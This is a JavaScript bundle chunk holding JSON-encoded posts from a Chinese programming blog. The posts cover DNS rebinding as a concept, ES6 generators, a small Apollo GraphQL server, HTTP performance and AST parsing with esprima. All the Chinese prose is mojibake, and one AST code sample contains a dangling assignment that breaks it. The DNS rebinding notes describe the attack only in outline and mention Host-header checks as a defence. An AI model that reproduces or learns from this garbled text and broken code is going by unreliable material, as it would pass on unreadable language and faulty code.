¹æ®ä¸»æœºå¤´æ¥è¿‡æ»¤ã€‚</p>\\n<blockquote>\\n<p>æ­¤æ ‡å¤´åŒ…å«åœ¨ä»ç°ä»£æµè§ˆå™¨å‘é€çš„æ‰€æœ‰HTTPè¯·æ±‚ä¸­ï¼Œå®ƒåŒ…å«æœŸæœ›ä¸ä¹‹é€šä¿¡çš„æœåŠ¡å™¨çš„ä¸»æœºï¼ˆä¸»æœºåï¼šç«¯å£ï¼‰ã€‚\\n æ­¤å€¼å¯ä»¥æ˜¯åŸŸåæˆ–IPåœ°å€ï¼Œä½†æ— è®ºå“ªç§æ–¹å¼ï¼Œæ¥æ”¶è¯·æ±‚çš„æœåŠ¡å™¨éƒ½åº”éªŒè¯å…¶è‡ªå·±çš„ä¸»æœºæ˜¯å¦ä¸æ‰€è¯·æ±‚çš„ä¸»æœºåŒ¹é…ã€‚ç”±äºDNSé‡æ–°ç»‘å®šä¾èµ–äºä¸åŸŸåå…³è”çš„åŸºç¡€IPåœ°å€çš„æ›´æ”¹ï¼Œé‡ç»‘å®šåˆ°ç›®æ ‡æœåŠ¡çš„æ¶æ„HTTPè¯·æ±‚ä¸­çš„Hostå¤´ä¼šä¿æŒåŸå§‹çš„åŸŸåã€‚</p>\\n</blockquote>\\n</li>\\n</ol>\\n<p>å‚è€ƒï¼š<a href=\\"https://bbs.pediy.com/thread-230047.htm\\">åˆ©ç”¨DNSé‡ç»‘å®šæ”»å‡»ä¸“ç”¨ç½‘ç»œ</a></p>\\n","toc":[],"relatedTags":null,"created_at":"2018-11-03","timeArr":[2018,10,3,0,0,0,0],"title":"DNSé‡ç»‘å®šæ”»å‡»-æç¤ºç‚¹","uuid":"13253a7dee631700da97fcd58ea9765840ae7706","summary":"<p>æ”»å‡»è€…éœ€è¦çŸ¥é“çš„ï¼š</p>\\n<ul>\\n<li>çŸ¥é“è¢«æ”»å‡»ç½‘ç«™åœ°å€</li>\\n<li>çŸ¥é“è¢«æ”»å‡»ç½‘ç«™<strong>å†…éƒ¨</strong>ç¼ºå°‘è®¤è¯ç¯èŠ‚</li>\\n<li>çŸ¥é“éœ€è¦è¯·æ±‚çš„(ç›®æ ‡)å­˜æ”¾åœ¨å“ªä¸ªä½ç½®</li>\\n</ul>\\n<p>è¢«æ”»å‡»è¿™éœ€è¦åšçš„ï¼š</p>\\n<ul>\\n<li>é€šè¿‡è¯±å¯¼é“¾æ¥è®¿é—®äº†æ¶æ„ç½‘ç«™</li>\\n</ul>\\n<p>æ‰§è¡Œå…³é”®ç‚¹</p>\\n<ul>\\n<li>æ¶æ„ç½‘ç«™ç¬¬ä¸€æ¬¡å“åº”DNSä¸ºå®é™…DNSï¼ŒTTLæçŸ­ï¼Œç„¶åæ‰§è¡Œè¯·æ±‚(ä½œç”¨åœ¨æ¶æ„ç½‘ç«™ä¸Š)ã€‚</li>\\n<li>æ¶æ„ç½‘ç«™ç¬¬äºŒæ¬¡å“åº”DN...</li>\\n</ul>","slug":"DNS-zhong-bang-ding-gong-ji-ti-shi-dian","sha":"2d4b04e1670845ec9792e2d6dbb9a9828db06632"}')},552:function(n){n.exports=JSON.parse('{"content":"<p>Generatorså‡½æ•°çš„åŒå‘ä¼ é€’</p>\\n<p>æ¯æ¬¡è°ƒç”¨<code>answer()</code>ï¼Œç›¸å½“äºåœ¨<code>generators</code>å‡½æ•°çš„nextæ–¹æ³•åŠ å…¥å‚æ•°ï¼Œè¿™ä¸ªå‚æ•°ä¼šè¿”å›ç»™<code>yield</code>çš„è¿”å›å€¼</p>\\n<p>åœ¨å‡½æ•°å†…éƒ¨å¯ä»¥åˆ¤æ–­è¿™ä¸ªè¿”å›å€¼ï¼Œå®ç°åŒå‘ä¼ é€’</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>  <span class=\\"hljs-keyword\\">let</span> stepCount=<span class=\\"hljs-number\\">1</span>\\n  <span class=\\"hljs-keyword\\">let</span> currentPoint=<span class=\\"hljs-number\\">1</span>\\n  <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> *<span class=\\"hljs-title\\">stepToStep</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n    <span class=\\"hljs-keyword\\">while</span>(stepCount&lt;<span class=\\"hljs-number\\">4</span>){\\n      <span class=\\"hljs-keyword\\">let</span> choose=<span class=\\"hljs-keyword\\">yield</span> <span class=\\"hljs-string\\">\'Choose Left or Right ?Call \\"answer()\\" to answer!\'</span>\\n      <span class=\\"hljs-keyword\\">if</span>(choose===<span class=\\"hljs-string\\">\'left\'</span>)currentPoint+=stepCount++;\\n      <span class=\\"hljs-keyword\\">else</span> <span class=\\"hljs-keyword\\">if</span> (choose===<span class=\\"hljs-string\\">\'right\'</span>)currentPoint+=<span class=\\"hljs-number\\">1</span>+stepCount++;\\n      <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">`You have arrived at point <span class=\\"hljs-subst\\">${currentPoint}</span>`</span>)\\n    }\\n    <span class=\\"hljs-keyword\\">if</span>(currentPoint===<span class=\\"hljs-number\\">9</span>)<span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\'Good End\'</span>)\\n    <span class=\\"hljs-keyword\\">else</span> <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\'Bad End\'</span>)\\n  }\\n  <span class=\\"hljs-keyword\\">let</span> start= stepToStep()\\n  <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">answer</span>(<span class=\\"hljs-params\\">answer</span>)</span>{\\n    <span class=\\"hljs-built_in\\">console</span>.log(start.next(answer.toLowerCase()).value)\\n  }\\n  <span class=\\"hljs-built_in\\">console</span>.log(start.next().value)</code></pre></code></pre>\\n","toc":[],"relatedTags":null,"created_at":"2018-09-14","timeArr":[2018,8,14,0,0,0,0],"title":"ES6çš„Generatorså‡½æ•°åŒå‘ä¼ å€¼","uuid":"a20bb2e8ea076042017b4a5a990e2aac82af6a1b","summary":"<p>Generatorså‡½æ•°çš„åŒå‘ä¼ é€’</p>\\n<p>æ¯æ¬¡è°ƒç”¨<code>answer()</code>ï¼Œç›¸å½“äºåœ¨<code>generators</code>å‡½æ•°çš„nextæ–¹æ³•åŠ å…¥å‚æ•°ï¼Œè¿™ä¸ªå‚æ•°ä¼šè¿”å›ç»™<code>yield</code>çš„è¿”å›å€¼</p>\\n<p>åœ¨å‡½æ•°å†…éƒ¨å¯ä»¥åˆ¤æ–­è¿™ä¸ªè¿”å›å€¼ï¼Œå®ç°åŒå‘ä¼ é€’</p>\\n<pre class=\\"hljs\\"><code>  <span class=\\"hljs-keyword\\">let</span> stepCount=<span class=\\"hljs-number\\">1</span>\\n  <span class=\\"hljs-keyword\\">let</span> currentPoint=<span class=\\"hljs-number\\">1</span>\\n  functi...</code></pre>","slug":"ES6-de-Generators-han-shu-shuang-xiang-chuan-zhi","sha":"cacba9466975c15e93a9cba0db310bf12752a2c2"}')},553:function(n){n.exports=JSON.parse('{"content":"<ul>\\n<li><p>ä¸ºä»€ä¹ˆè¦å®ç°ä¸€ä¸ª<code>GraphQL</code>æœåŠ¡å™¨</p>\\n<p>  é€šè¿‡è‡ªå·±å®ç°ï¼Œæ›´æ·±å…¥äº†è§£<code>GraphQL</code>æ€ä¹ˆæ„é€ ï¼Œæ€ä¹ˆè·å–ï¼Œä¸€äº›æœ¯è¯­</p>\\n</li>\\n<li><p>ç›´æ¥å…¥æ­£é¢˜ï¼Œå¦‚ä½•å®ç°ä¸€ä¸ª<code>GraphQL</code>æœåŠ¡å™¨</p>\\n<p>  äº†è§£4ç§ç±»å‹</p>\\n<ul>\\n<li><p>Query</p>\\n<p>  æ‰§è¡Œå†…å®¹æŸ¥è¯¢</p>\\n</li>\\n<li><p>Mutation</p>\\n<p>  æ‰§è¡Œå†…å®¹å˜æ›´</p>\\n</li>\\n<li><p>Schema</p>\\n<p>  æ¨¡å¼ï¼Œå®šä¹‰å†…å®¹ç»“æ„åŠç±»å‹</p>\\n</li>\\n<li><p>Resolvers</p>\\n<p>  è¿æ¥<code>Schema</code>å’Œ<code>Query</code>ï¼Œä¹Ÿå°±æ˜¯å…·ä½“å†…å®¹ã€‚</p>\\n</li>\\n</ul>\\n</li>\\n</ul>\\n<ol>\\n<li><p>å®šä¹‰Schema</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> <span class=\\"hljs-keyword\\">import</span> { gql } <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'apollo-server-express\'</span>;\\n\\n <span class=\\"hljs-keyword\\">const</span> typeDefs = gql<span class=\\"hljs-string\\">`\\n     type Person {\\n         id: Int\\n         name: String\\n         gender: String\\n         homeworld: String\\n     }\\n     input DataInput {        \\n         id: Int!\\n         name: String\\n         gender: String\\n         homeworld: String\\n     }\\n     type Mutation {\\n         setPerson(input:DataInput!):Person\\n     }\\n     type Query {\\n         allPeople: [Person]\\n         person(id: Int!): Person\\n     }\\n `</span>;\\n\\n <span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-keyword\\">default</span> typeDefs;</code></pre></code></pre>\\n<p> è¿™é‡Œå®šä¹‰äº†1ä¸ªè‡ªå®šä¹‰æŸ¥è¯¢ç±»<code>Person</code>ï¼Œ1ä¸ªè‡ªå®šä¹‰ä¿®æ”¹ç±»<code>DataInput</code>ï¼Œ1ä¸ª<code>Mutation</code>æ–¹æ³•ï¼Œ2ä¸ª<code>Query</code>æ–¹æ³•ï¼Œå…¶ä¸­åŠ <code>!</code>è¡¨ç¤ºè¿™ä¸ªå­—æ®µä¸å¯ç¼ºå°‘ã€‚</p>\\n</li>\\n<li><p>å®šä¹‰<code>Resolvers</code></p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> <span class=\\"hljs-keyword\\">const</span> defaultData = [\\n   {\\n     <span class=\\"hljs-attr\\">id</span>: <span class=\\"hljs-number\\">1</span>,\\n     <span class=\\"hljs-attr\\">name</span>: <span class=\\"hljs-string\\">\'Luke SkyWaler\'</span>,\\n     <span class=\\"hljs-attr\\">gender</span>: <span class=\\"hljs-string\\">\'male\'</span>,\\n     <span class=\\"hljs-attr\\">homeworld</span>: <span class=\\"hljs-string\\">\'Tattoine\'</span>\\n   },\\n   {\\n     <span class=\\"hljs-attr\\">id</span>: <span class=\\"hljs-number\\">2</span>,\\n     <span class=\\"hljs-attr\\">name</span>: <span class=\\"hljs-string\\">\'C-3PO\'</span>,\\n     <span class=\\"hljs-attr\\">gender</span>: <span class=\\"hljs-string\\">\'bot\'</span>,\\n     <span class=\\"hljs-attr\\">homeworld</span>: <span class=\\"hljs-string\\">\'Tattoine\'</span>\\n   }\\n ];\\n\\n <span class=\\"hljs-keyword\\">const</span> resolvers = {\\n   <span class=\\"hljs-attr\\">Mutation</span>: {\\n     <span class=\\"hljs-attr\\">setPerson</span>: <span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">firstParam, {input}</span>) =&gt;</span> {\\n       <span class=\\"hljs-keyword\\">let</span> matchIdx = defaultData.length\\n       <span class=\\"hljs-keyword\\">const</span> {id} = input\\n       <span class=\\"hljs-keyword\\">let</span> matchObj = defaultData.find(<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">obj, i</span>) =&gt;</span> {\\n         <span class=\\"hljs-keyword\\">if</span> (obj.id === id) {\\n           matchIdx = i\\n           <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-literal\\">true</span>\\n         }\\n       })\\n       <span class=\\"hljs-keyword\\">let</span> defaultObj\\n       <span class=\\"hljs-keyword\\">if</span> (matchObj) defaultObj = matchObj\\n       <span class=\\"hljs-keyword\\">else</span> defaultObj = {<span class=\\"hljs-attr\\">name</span>: <span class=\\"hljs-string\\">\'\'</span>, <span class=\\"hljs-attr\\">gender</span>: <span class=\\"hljs-string\\">\'\'</span>, <span class=\\"hljs-attr\\">homeworld</span>: <span class=\\"hljs-string\\">\'\'</span>}\\n       <span class=\\"hljs-keyword\\">let</span> newObj = <span class=\\"hljs-built_in\\">Object</span>.assign(defaultObj, input)\\n       defaultData[matchIdx] = newObj\\n       <span class=\\"hljs-keyword\\">return</span> newObj\\n     }\\n   },\\n   <span class=\\"hljs-attr\\">Query</span>: {\\n     <span class=\\"hljs-attr\\">allPeople</span>: <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> {\\n       <span class=\\"hljs-keyword\\">return</span> defaultData;\\n     },\\n     <span class=\\"hljs-attr\\">person</span>: <span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">root, {id}</span>) =&gt;</span> {\\n       <span class=\\"hljs-keyword\\">return</span> defaultData.filter(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">character</span> =&gt;</span> {\\n         <span class=\\"hljs-keyword\\">return</span> (character.id === id);\\n       })[<span class=\\"hljs-number\\">0</span>];\\n     }\\n   }\\n };\\n\\n <span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-keyword\\">default</span> resolvers;</code></pre></code></pre>\\n<p> è¿™é‡Œå®šä¹‰äº†å¯¹<code>Query</code>å’Œ<code>Mutation</code>çš„å…·ä½“æ‰§è¡Œæ–¹æ³•ï¼Œæ³¨æ„ï¼Œå®ƒä»¬çš„å€¼å¿…é¡»æ˜¯<code>Object</code>æˆ–è€…<code>Function</code>ã€‚</p>\\n<blockquote>\\n<p>PS: è¿™é‡Œæˆ‘æ²¡ææ¸…æ¥š <code>Mutation</code> ç¬¬ä¸€ä¸ªå‚æ•°<code>firstParam</code>çš„ä½œç”¨ï¼Œä¸€ç›´éƒ½æ˜¯<code>undefined</code></p>\\n</blockquote>\\n</li>\\n<li><p>åˆ›å»ºæœåŠ¡å™¨</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> <span class=\\"hljs-keyword\\">import</span> express <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'express\'</span>;\\n <span class=\\"hljs-keyword\\">import</span> {ApolloServer, gql } <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'apollo-server-express\'</span>;\\n <span class=\\"hljs-keyword\\">import</span> typeDefs <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'./api/schema\'</span>;\\n <span class=\\"hljs-keyword\\">import</span> resolvers <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'./api/resolvers\'</span>;\\n\\n <span class=\\"hljs-keyword\\">const</span> server = <span class=\\"hljs-keyword\\">new</span> ApolloServer({\\n   typeDefs,\\n   resolvers,\\n });\\n\\n <span class=\\"hljs-keyword\\">const</span> app = express();\\n server.applyMiddleware({ app });\\n\\n app.get(<span class=\\"hljs-string\\">\'/\'</span>, (req, res) =&gt; res.send(<span class=\\"hljs-string\\">\'Babel Working!\'</span>));\\n\\n app.listen({ <span class=\\"hljs-attr\\">port</span>: <span class=\\"hljs-number\\">4000</span> }, () =&gt;\\n   <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">`ğŸš€ Server ready at http://localhost:4000<span class=\\"hljs-subst\\">${server.graphqlPath}</span>`</span>)\\n );</code></pre></code></pre>\\n</li>\\n<li><p>package.json</p>\\n<pre><code><pre class=\\"hljs\\"><code> {\\n   &quot;name&quot;: &quot;gh-demo&quot;,\\n   &quot;version&quot;: &quot;1.0.0&quot;,\\n   &quot;description&quot;: &quot;&quot;,\\n   &quot;main&quot;: &quot;index.js&quot;,\\n   &quot;scripts&quot;: {\\n   &quot;dev&quot;: &quot;babel-watch index.js&quot;\\n },\\n   &quot;keywords&quot;: [],\\n   &quot;author&quot;: &quot;&quot;,\\n   &quot;license&quot;: &quot;ISC&quot;,\\n   &quot;dependencies&quot;: {\\n     &quot;apollo-server-express&quot;: &quot;^2.2.1&quot;,\\n     &quot;express&quot;: &quot;^4.16.4&quot;,\\n     &quot;graphql&quot;: &quot;^14.0.2&quot;\\n },\\n   &quot;devDependencies&quot;: {\\n   &quot;babel-cli&quot;: &quot;^6.26.0&quot;,\\n     &quot;babel-preset-env&quot;: &quot;^1.7.0&quot;,\\n     &quot;babel-watch&quot;: &quot;^2.0.7&quot;\\n }\\n }</code></pre></code></pre></li>\\n</ol>\\n<p>å‚è€ƒï¼š<a href=\\"https://medium.com/crowdbotics/creating-a-graphql-server-with-nodejs-ef9814a7e0e6\\">Creating a GraphQL server with NodeJS</a></p>\\n","toc":[],"relatedTags":null,"created_at":"2018-11-13","timeArr":[2018,10,13,0,0,0,0],"title":"GraphQLæœåŠ¡å™¨çš„ç®€æ˜“å®ç°","uuid":"9b5e4a6871e0353c0cbc1f47c9de37eabe73f5da","summary":"<ul>\\n<li>\\n<p>ä¸ºä»€ä¹ˆè¦å®ç°ä¸€ä¸ª<code>GraphQL</code>æœåŠ¡å™¨</p>\\n<p>é€šè¿‡è‡ªå·±å®ç°ï¼Œæ›´æ·±å…¥äº†è§£<code>GraphQL</code>æ€ä¹ˆæ„é€ ï¼Œæ€ä¹ˆè·å–ï¼Œä¸€äº›æœ¯è¯­</p>\\n</li>\\n<li>\\n<p>ç›´æ¥å…¥æ­£é¢˜ï¼Œå¦‚ä½•å®ç°ä¸€ä¸ª<code>GraphQL</code>æœåŠ¡å™¨</p>\\n<p>äº†è§£4ç§ç±»å‹</p>\\n<ul>\\n<li>\\n<p>Query</p>\\n<p>æ‰§è¡Œå†…å®¹æŸ¥è¯¢</p>\\n</li>\\n<li>\\n<p>Muta...</p>\\n</li>\\n</ul>\\n</li>\\n</ul>","slug":"GraphQL-fu-wu-qi-de-jian-yi-shi-xian","sha":"2df708b7274da2278a0b10daebf16bf60e8a965f"}')},554:function(n){n.exports=JSON.parse('{"content":"<p>å½±å“<code>Http</code>æ€§èƒ½çš„å‡ ç‚¹ï¼š</p>\\n<ol>\\n<li><p>TCP æ…¢å¯åŠ¨</p>\\n<p> æŒ‡çš„æ˜¯TCPè¿æ¥æœ€åˆä¼šè¢«é™åˆ¶è¿æ¥æœ€å¤§é€Ÿåº¦ï¼Œåªæœ‰å½“æ•°æ®ä¼ é€æˆåŠŸï¼Œæ‰ä¼šé€æ­¥æé«˜ä¼ è¾“é€Ÿåº¦ï¼Œè¿™æ˜¯ä¸ºäº†é˜²æ­¢å› ç‰¹ç½‘çªç„¶è¿‡è½½å’Œæ‹¥å¡ã€‚</p>\\n</li>\\n<li><p><code>Nagle</code>ç®—æ³•</p>\\n<p> å°†å¤§é‡TCPæ•°æ®ç»‘å®šåœ¨ä¸€èµ·ï¼Œé¿å…å¤§é‡çš„å°æ•°æ®çš„åˆ†ç»„ã€‚ä½†é—®é¢˜æ˜¯ï¼Œå¯èƒ½å› ä¸ºç­‰å¾…å…¶ä»–TCPæ•°æ®äº§ç”Ÿå»¶è¿Ÿã€‚</p>\\n<p> å¼€å¯<code>TCP_NODELAY</code>é€‰é¡¹å¯ä»¥ç¦ç”¨<code>Nagle</code>ç®—æ³•ï¼Œéœ€è¦å°½é‡ç¡®ä¿å‘é€å¤§å—æ•°æ®ã€‚</p>\\n</li>\\n<li><p>TIME_WAIT</p>\\n<p> æŒ‡çš„æ˜¯åœ¨å…³é—­TCPè¿æ¥æ—¶ï¼Œä¼šæœ‰ä¸€å°æ®µä¿¡æ¯ç¼“å­˜æœ€è¿‘å…³é—­çš„IPåœ°å€å’Œç«¯å£å·ï¼Œç»´æŒ<code>2MSL</code>ï¼Œè¿™æ®µæ—¶é—´å†…æ— æ³•åˆ›å»ºç›¸åŒçš„IPåœ°å€å’Œç«¯å£å·ã€‚</p>\\n<blockquote>\\n<p>MSLï¼šMaximum Segment Lifetimeï¼Œè§„å®šæ˜¯2åˆ†é’Ÿï¼Œå®é™…ä¹Ÿæœ‰30ç§’ï¼Œ1åˆ†é’Ÿã€‚</p>\\n</blockquote>\\n<p> ä¹‹æ‰€ä»¥ç­‰å¾…<code>2MSL</code>æ˜¯ä¸ºäº†ä¿è¯å®¢æˆ·ç«¯å‘é€çš„æœ€åä¸€ä¸ªACKæŠ¥æ–‡èƒ½å¤Ÿåˆ°è¾¾æœåŠ¡ç«¯ã€‚</p>\\n</li>\\n<li><p>ä¸²è¡Œäº‹åŠ¡å¤„ç†</p>\\n<p> å¦‚æœæ¯ä¸ªäº‹åŠ¡éƒ½éœ€è¦å»ºç«‹ä¸€æ¡æ–°çš„é“¾æ¥ï¼Œé‚£ä¹ˆè¿æ¥æ—¶å»¶å’Œæ…¢å¯åŠ¨æ—¶å»¶å°±ä¼šå åŠ èµ·æ¥ã€‚</p>\\n</li>\\n</ol>\\n<p>è§£å†³<code>Http</code>æ€§èƒ½çš„å‡ ç‚¹ï¼š</p>\\n<ol>\\n<li><p>å¹¶è¡Œè¿æ¥</p>\\n<p> å®¢æˆ·ç«¯æ‰“å¼€å¤šæ¡è¿æ¥ï¼Œå¹¶è¡Œåœ°æ‰§è¡Œå¤šä¸ªHTTPäº‹åŠ¡ï¼Œå……åˆ†åˆ©ç”¨å› ç‰¹ç½‘çš„å¸¦å®½ï¼Œä½†è¿˜æ˜¯å—æ…¢å¯åŠ¨å½±å“ã€‚</p>\\n</li>\\n<li><p>æŒä¹…è¿æ¥</p>\\n<p> é¿å…æ…¢å¯åŠ¨é˜¶æ®µå’Œé‡å¤å‘é€æŠ¥æ–‡å¤´éƒ¨ï¼Œä½†è¦æ³¨æ„é¿å…ç´¯ç§¯å¤§é‡ç©ºé—²è¿æ¥ã€‚</p>\\n<p> <code>keep-alive</code>é¦–éƒ¨å‘é€è¯·æ±‚ï¼Œéœ€è¦æœåŠ¡å™¨è¿”å›<code>Connection:Keep-Alive</code>é¦–éƒ¨ï¼Œå¦åˆ™å®¢æˆ·ç«¯è®¤ä¸ºæœåŠ¡ç«¯ä¸æ”¯æŒ<code>keep-alive</code>ã€‚</p>\\n<p> å‚æ•°<code>timeout</code>ï¼Œä¼°è®¡äº†æœåŠ¡å™¨å¸Œæœ›è¿æ¥ä¿æŒæ´»è·ƒçš„æ—¶é—´ï¼Œå¹¶ä¸æ˜¯ä¸€ä¸ªæ‰¿è¯ºå€¼ã€‚</p>\\n<p> å‚æ•°<code>max</code>ï¼Œä¼°è®¡äº†æœåŠ¡å™¨å¸Œæœ›ä¸ºå¤šå°‘ä¸ªäº‹åŠ¡ä¿æŒè¿æ¥æ´»è·ƒçŠ¶æ€ï¼Œå¹¶ä¸æ˜¯ä¸€ä¸ªæ‰¿è¯ºå€¼ã€‚</p>\\n<p> http1.0 ä½¿ç”¨<code>connection:keep-alive</code>å¼€å¯æŒä¹…è¿æ¥ã€‚</p>\\n<p> http1.1é»˜è®¤å¼€å¯æŒä¹…è¿æ¥ï¼Œåä¸º<code>persistent connection</code>,å½“éœ€è¦å…³é—­æ—¶ï¼Œå‘é€<code>connection:close</code>ã€‚</p>\\n</li>\\n<li><p>ç®¡é“åŒ–è¿æ¥</p>\\n<p> http1.1 åœ¨æŒä¹…è¿æ¥ä¸Šå¯é€‰æ‹©ä½¿ç”¨è¯·æ±‚ç®¡é“ã€‚</p>\\n<p> ä½¿ç”¨ç®¡é“åŒ–èƒ½åœ¨è¯·æ±‚çš„åŒæ—¶ï¼Œç»§ç»­åç»­çš„è¯·æ±‚ï¼Œæé«˜æ€§èƒ½ï¼Œä½†ä¸åº”è¯¥ä½¿ç”¨æœ‰å‰¯ä½œç”¨çš„è¯·æ±‚ã€‚</p>\\n</li>\\n</ol>\\n","toc":[],"relatedTags":null,"created_at":"2019-04-11","timeArr":[2019,3,11,0,0,0,0],"title":"ã€ŠHttpæƒå¨æŒ‡å—ã€‹httpæ€§èƒ½","uuid":"2d6cd16c42d4c8dc0c9ccfed027881544a800d15","summary":"<p>å½±å“<code>Http</code>æ€§èƒ½çš„å‡ ç‚¹ï¼š</p>\\n<ol>\\n<li>\\n<p>TCP æ…¢å¯åŠ¨</p>\\n<p>æŒ‡çš„æ˜¯TCPè¿æ¥æœ€åˆä¼šè¢«é™åˆ¶è¿æ¥æœ€å¤§é€Ÿåº¦ï¼Œåªæœ‰å½“æ•°æ®ä¼ é€æˆåŠŸï¼Œæ‰ä¼šé€æ­¥æé«˜ä¼ è¾“é€Ÿåº¦ï¼Œè¿™æ˜¯ä¸ºäº†é˜²æ­¢å› ç‰¹ç½‘çªç„¶è¿‡è½½å’Œæ‹¥å¡ã€‚</p>\\n</li>\\n<li>\\n<p><code>Nagle</code>ç®—æ³•</p>\\n<p>å°†å¤§é‡TCPæ•°æ®ç»‘å®šåœ¨ä¸€èµ·ï¼Œé¿å…å¤§é‡çš„å°æ•°æ®çš„åˆ†ç»„ã€‚ä½†é—®é¢˜æ˜¯ï¼Œå¯èƒ½å› ä¸ºç­‰å¾…å…¶ä»–TCPæ•°æ®äº§...</p>\\n</li>\\n</ol>","slug":"Http-quan-wei-zhi-nan-http-xing-neng","sha":"b037d4e8d3b90a0aa21d65b03af8e28caf013de4"}')},555:function(n){n.exports=JSON.parse('{"content":"<h4 id=\\"shi-yong-ast-wan-cheng-xu-qiu\\">ä½¿ç”¨ASTå®Œæˆéœ€æ±‚</h4>\\n<p>éœ€æ±‚ï¼šè¾“å‡ºæ–¹æ³•ä¸­çš„å‚æ•°ä¸ºå­—ç¬¦ä¸²&#39;1234&#39;çš„å˜é‡å</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">x</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n  <span class=\\"hljs-keyword\\">var</span> a=<span class=\\"hljs-built_in\\">parseInt</span>(<span class=\\"hljs-string\\">\'1234\'</span>);\\n  <span class=\\"hljs-keyword\\">var</span> b=<span class=\\"hljs-string\\">\'1234\'</span>;\\n  <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">double</span>(<span class=\\"hljs-params\\">n</span>)</span>{\\n    <span class=\\"hljs-keyword\\">return</span> n*<span class=\\"hljs-number\\">2</span>\\n  }\\n  <span class=\\"hljs-keyword\\">var</span> c=double(<span class=\\"hljs-string\\">\'1234\'</span>);\\n  <span class=\\"hljs-keyword\\">var</span> d=double(<span class=\\"hljs-number\\">1234</span>);\\n  <span class=\\"hljs-keyword\\">var</span> e=(<span class=\\"hljs-string\\">\'1234\'</span>)*<span class=\\"hljs-number\\">2</span>;\\n  <span class=\\"hljs-keyword\\">var</span> f=<span class=\\"hljs-string\\">\\"double(\'1234\')\\"</span>;\\n}</code></pre></code></pre>\\n<p>å¦‚æœä½¿ç”¨æ­£åˆ™ï¼Œæˆ‘ä»¬éœ€è¦å®šä¹‰ï¼š</p>\\n<ol>\\n<li>éœ€è¦åœ¨æ–¹æ³•å‚æ•°å†…(æ‹¬å·å‰é¢å¿…é¡»æ˜¯ç¬¦åˆå‘½åæ ¼å¼çš„æ–¹æ³•å)ï¼Œè¿‡æ»¤b,e</li>\\n<li>å¿…é¡»æ˜¯å­—ç¬¦ä¸²1234ï¼Œè¿‡æ»¤d</li>\\n<li>å¿…é¡»åœ¨æ–¹æ³•è°ƒç”¨å†…ï¼Œè€Œä¸æ˜¯å­—ç¬¦ä¸²å†…ï¼Œè¿‡æ»¤f</li>\\n</ol>\\n<p>å› ä¸ºå¦‚æœç”¨æ­£åˆ™å¤„ç†ï¼Œä¼šæ¯”è¾ƒç¹ç</p>\\n<p>å°è¯•ä½¿ç”¨ASTï¼Œç›´æ¥ä¸Šä»£ç </p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> esprima=<span class=\\"hljs-built_in\\">require</span>(<span class=\\"hljs-string\\">\'esprima\'</span>);\\n<span class=\\"hljs-keyword\\">const</span> estraverse =<span class=\\"hljs-built_in\\">require</span>(<span class=\\"hljs-string\\">\'estraverse\'</span>);\\n\\n<span class=\\"hljs-keyword\\">const</span> ast=esprima.parse(x.toString())\\nestraverse.traverse(ast, {\\n  <span class=\\"hljs-attr\\">enter</span>: <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> (<span class=\\"hljs-params\\">node,parent</span>) </span>{\\n    <span class=\\"hljs-keyword\\">if</span>(node.type===<span class=\\"hljs-string\\">\\"CallExpression\\"</span> <span class=\\"hljs-comment\\">// å¯¹åº”æ­£åˆ™ä¸­ç¬¬3æ¡</span>\\n      &amp;&amp; node.callee.type===<span class=\\"hljs-string\\">\\"Identifier\\"</span>  <span class=\\"hljs-comment\\">// å¯¹åº”æ­£åˆ™ä¸­ç¬¬1æ¡</span>\\n      &amp;&amp; node.arguments[<span class=\\"hljs-number\\">0</span>].value===<span class=\\"hljs-string\\">\\"1234\\"</span>\\n      ){ <span class=\\"hljs-comment\\">// å¯¹åº”æ­£åˆ™ä¸­ç¬¬2æ¡</span>\\n      node.arguments[<span class=\\"hljs-number\\">0</span>].value=\\n      <span class=\\"hljs-built_in\\">console</span>.log(parent.id.name) \\n    }\\n  }\\n});\\n<span class=\\"hljs-comment\\">// a</span>\\n<span class=\\"hljs-comment\\">// c</span></code></pre></code></pre>\\n","toc":[{"anchor":"shi-yong-ast-wan-cheng-xu-qiu","level":4,"text":"ä½¿ç”¨ASTå®Œæˆéœ€æ±‚"}],"relatedTags":null,"created_at":"2018-06-27","timeArr":[2018,5,27,0,0,0,0],"title":"JSçš„AST(Esprima.parse)","uuid":"36b0972f79325bab8c6db377892c184e894e5492","summary":"<h4>ä½¿ç”¨ASTå®Œæˆéœ€æ±‚</h4>\\n<p>éœ€æ±‚ï¼šè¾“å‡ºæ–¹æ³•ä¸­çš„å‚æ•°ä¸ºå­—ç¬¦ä¸²\'1234\'çš„å˜é‡å</p>\\n<pre class=\\"hljs\\"><code><span 